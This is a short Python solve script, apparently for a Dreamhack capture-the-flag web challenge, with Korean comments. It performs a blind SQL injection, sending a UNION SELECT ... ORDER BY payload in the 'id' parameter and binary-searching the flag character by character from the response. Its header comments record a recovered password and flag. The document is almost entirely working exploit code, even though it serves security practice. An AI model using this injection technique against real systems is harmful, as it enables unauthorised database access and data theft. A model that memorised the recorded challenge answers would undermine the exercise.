# pw_column : xvvcPw4coaa1sslfe
# pw : wkdlfhpw!!@%%#@@#
# flag : 0u98p7mk6ixnlg5ofrcewtq2yajhb4vd3s1z

import requests

url = "http://host1.dreamhack.games:21097/"

data = list("0123456789abcdefghijklmnopqrstuvwxyz")

flag = ""

for _ in range(36):
    start = 0 			# 맨 처음 위치
    end = len(data) - 1 	# 맨 마지막 위치
    mid = (start + end) // 2 # 중간값

    while start <= end and end >= 0 and mid >= 0:
        params = {"id": f"' or 1 union select null, null, null, '{flag+data[mid]}', null order by 4 -- -"}
        res = requests.get(url=url, params=params)
        print(res.text)

        if "zairowkdlfhdkel" in res.text:
            end = mid - 1
            mid = (start + end) // 2 # 중간값
        else:                    # target이 크면 오른쪽을 더 탐색
            start = mid + 1
            mid = (start + end) // 2 # 중간값
    
    flag += data[mid]
    data.remove(data[mid])
    print(flag)